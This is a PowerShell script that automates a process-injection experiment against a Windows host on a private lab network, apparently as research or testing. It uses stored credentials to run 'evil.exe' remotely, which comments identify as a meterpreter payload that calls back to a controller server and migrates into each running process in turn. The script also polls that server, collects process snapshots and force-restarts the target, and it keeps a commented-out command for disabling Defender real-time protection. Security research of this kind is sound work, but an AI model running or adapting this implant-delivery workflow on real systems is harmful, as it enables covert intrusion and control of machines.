$creds = Import-Clixml -Path .\creds.xml

$target = "192.168.88.78"

# wait until a command succeeds to proceed
$unavailable = $true
While($unavailable){
    Try{
        Invoke-Command -Credential $creds -ScriptBlock { Get-Process -IncludeUserName } -ComputerName $target -ErrorAction Stop
        $resp = Invoke-WebRequest 192.168.88.65:8000/reset_transcript
        $unavailable = $false
    }Catch{
        Write-Host "Host is down, trying again in 30 seconds..." -ForegroundColor Red
        Start-Sleep 30
    }
}
Write-Host "Host is up, continuing..." -ForegroundColor Green


# epoch time
$date1 = Get-Date -Date "01/01/1970"
$date2 = Get-Date
$epoch = (New-TimeSpan -Start $date1 -End $date2).TotalSeconds

# set up where it will be stored
$directory = [string]$epoch
New-Item -ItemType Directory $directory > $null

# get process info before injection
Write-Host "Getting pre-injection baseline..." -ForegroundColor Yellow -NoNewline
Invoke-Command -Credential $creds -ScriptBlock { Get-Process -IncludeUserName | ConvertTo-Json -Depth 3 } -ComputerName $target | Out-File $directory\clean.json -Encoding utf8
Write-Host "OK" -ForegroundColor Green

# disable real-time protection
Write-Host "Disabling real-time protection..." -ForegroundColor Yellow -NoNewline
#Invoke-Command -Credential $creds -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true } -ComputerName $target
Write-Host "OK" -ForegroundColor Green

# figure out the best order
Write-Host "Specifying injection order..." -ForegroundColor Yellow -NoNewline
$procs = Get-Content $directory\clean.json | ConvertFrom-Json
Write-Host "OK" -ForegroundColor Green

$procs.Id | ForEach{
    # inject into one process at a time
    if(($procs | ? Id -EQ $_).Name -notlike "smss"){
        Write-Host ($procs | ? Id -EQ $_).Name -Nonewline
        $id_str = [string]$_
        $uri = "192.168.88.65:8000/specify_order/$id_str"
        $resp = Invoke-WebRequest -Uri $uri
        Write-Host " - $resp for PID $id_str, starting callback..." -ForegroundColor Yellow -NoNewline
        Start-Sleep -Milliseconds 500

        # start the callback and automigration
        Invoke-Command -Credential $creds -ScriptBlock { cmd /C "C:\Users\brandon\Desktop\injection\evil.exe" } -ComputerName $target
        Write-Host "OK" -ForegroundColor Green

        # give it a few seconds to finish, move on
        Start-Sleep 2
        $counter = 0
        while($counter -le 5 -and (Invoke-RestMethod 192.168.88.65:8000/still_injecting).status -ne 'complete'){
            $counter += 1
            Start-Sleep 1
        }
    }
}
Start-Sleep 2
$counter = 0
while($counter -le 5 -and (Invoke-RestMethod 192.168.88.65:8000/still_injecting).status -ne 'complete'){
    $counter += 1
    Start-Sleep 1
}

#$priority = 'NT AUTHORITY\SYSTEM','NT AUTHORITY\LOCAL SERVICE','NT AUTHORITY\NETWORK SERVICE','IE8WIN7\IEUser'
#$order = New-Object System.Collections.ArrayList
# add the high privilege procs first
#$priority | ForEach{
#    $procs | Where-Object UserName -Like $_ | ForEach{
#        $order.Add([string]$_.Id) > $null
#    }
#}
# add the rest of the processes
#$procs | ForEach{
#    If($order -notcontains $_.Id){
#        $order.Add([string]$_.Id) > $null
#    }
#}

# build the web request
#$csv = $order -join ','
#$uri = "192.168.88.65:8000/specify_order/$csv"
#$resp = Invoke-WebRequest -Uri $uri
#Write-Host "OK" -ForegroundColor Green

# start the callback, which automatically triggers the process migration
#Write-Host "Executing meterpreter payload..." -ForegroundColor Yellow -NoNewline
#Invoke-Command -Credential $creds -ScriptBlock { cmd /C "C:\Users\brandon\Desktop\injection\evil.exe" } -ComputerName $target
#Write-Host "OK" -ForegroundColor Green

# check every 10 seconds until migration is finished
#Write-Host "Waiting for migration to finish..." -ForegroundColor Yellow -NoNewline
#$response = Invoke-RestMethod 192.168.88.65:8000/still_injecting
#$iterations = 0
#While($response.status -ne 'complete' -and $iterations -lt 10){
#    Start-Sleep 10
#    $response = Invoke-RestMethod 192.168.88.65:8000/still_injecting
#    $iterations += 1
#}
#Write-Host "Done" -ForegroundColor Green

#If($iterations -gt 9){
#    Remove-Item $directory -Force -Recurse
#    Exit
#}

#Start-Sleep 30

# reset the transcript
Write-Host "Resetting the transcript..." -ForegroundColor Yellow -NoNewline
$transcript = Invoke-WebRequest 192.168.88.65:8000/get_results
$transcript.Content | Out-File $directory\transcript.txt -Encoding utf8
Write-Host "OK" -ForegroundColor Green
Get-Content $directory\transcript.txt | Select-String "successfully." | Measure-Object

# get injected process data
Write-Host "Collecting injected process data..." -ForegroundColor Yellow -NoNewline
Invoke-Command -Credential $creds -ScriptBlock { Get-Process -IncludeUserName | ConvertTo-Json -Depth 15 } -ComputerName $target | Out-File $directory\injected.json -Encoding utf8
Write-Host "OK" -ForegroundColor Green

# restart computer
Write-Host "Restarting computer..." -ForegroundColor Yellow -NoNewline
Invoke-Command -Credential $creds -ScriptBlock { Restart-Computer -Force } -ComputerName $target
Write-Host "OK" -ForegroundColor Green